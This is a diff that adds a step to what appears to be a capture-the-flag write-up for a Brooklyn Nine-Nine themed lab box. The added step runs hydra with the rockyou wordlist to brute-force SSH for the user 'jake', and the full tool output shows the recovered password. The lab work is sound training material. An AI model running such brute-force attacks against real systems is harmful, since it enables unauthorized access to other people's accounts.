@@ -91,6 +91,24 @@ From Amy,
 Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
 
 ```
+hydra
+```
+┌──(root💀kali)-[/home/kali]
+└─# hydra -l jake -P /usr/share/wordlists/rockyou.txt -t 64 10.10.18.236  ssh 
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-28 14:46:35
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking ssh://10.10.18.236:22/
+[22][ssh] host: 10.10.18.236   login: jake   password: 987654321
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 35 final worker threads did not complete until end.
+[ERROR] 35 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-28 14:47:37
+
+```
 ssh
 ```
 ┌──(root💀kali)-[/home/kali]
